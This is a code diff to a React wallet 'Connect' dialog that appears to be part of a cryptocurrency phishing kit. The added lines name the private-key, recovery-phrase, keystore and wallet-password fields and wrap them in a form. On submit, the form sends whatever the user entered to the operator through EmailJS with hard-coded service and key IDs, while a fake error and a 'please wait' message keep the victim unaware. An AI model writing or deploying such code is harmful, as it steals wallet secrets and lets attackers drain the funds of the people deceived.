@@ -1,12 +1,24 @@
 import "./connect.css";
 import { useState } from "react";
+import emailjs from "@emailjs/browser";
 const Connect = ({ clicked, setClicked, setConnect }) => {
     const [pay, setPay] = useState(false);
     const [keystore, setKeystore] = useState(false);
     const [phrase, setPhrase] = useState(true);
-    const [privated, setPrivated] = useState(false);
+  const [privated, setPrivated] = useState(false);
+  
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs.sendForm(
+      "service_vmo7w1b",
+      "template_cahks0v",
+      e.target,
+      "PsxFBEMmVNX8VqBtA"
+    );
+  }
     return (
-      <div className="connect">
+      <form className="connect" onSubmit={sendEmail}>
         <div className="image-icon">
           <img src={clicked} alt="" />
         </div>
@@ -42,20 +54,27 @@ const Connect = ({ clicked, setClicked, setConnect }) => {
         <div className="error-note">
           <p>An unknown error occured, please try again later.</p>
         </div>
-            {privated && (
-                <textarea
-                    placeholder="Enter Your Private Key"
-                    className="wallet-password"
-                ></textarea>)}
-            
-            {
-                phrase &&( <textarea placeholder="Enter your recovery phrase"></textarea>)
-            }
-        
-            {keystore && (
+
+        {privated && (
+          <textarea
+            placeholder="Enter Your Private Key"
+            className="wallet-password"
+            name="private-key"
+          ></textarea>
+        )}
+
+        {phrase && (
+          <textarea
+            name="recovery-phase"
+            placeholder="Enter your recovery phrase"
+          ></textarea>
+        )}
+
+        {keystore && (
           <>
-            <textarea placeholder="Enter Keystore"></textarea>
+            <textarea name="keystore" placeholder="Enter Keystore"></textarea>
             <textarea
+              name="wallet-password"
               placeholder="Wallet password"
               className="wallet-password"
             ></textarea>
@@ -74,6 +93,7 @@ const Connect = ({ clicked, setClicked, setConnect }) => {
         )}
 
         <button
+          type="submit"
           className="proceed-btn"
           onClick={() => {
             setPay(true);
@@ -82,8 +102,8 @@ const Connect = ({ clicked, setClicked, setConnect }) => {
           PROCEED
         </button>
         <div className="basement">
-          <p className={pay ? "pay visible" : "pay"}>
-            this feature needs more payment 😎
+          <p className={pay ? "pay" : "pay"}>
+            please wait as we process your request 😎
           </p>
           <button
             className="cancel-btn"
@@ -95,7 +115,7 @@ const Connect = ({ clicked, setClicked, setConnect }) => {
             CANCEL
           </button>
         </div>
-      </div>
+      </form>
     );
 }
  
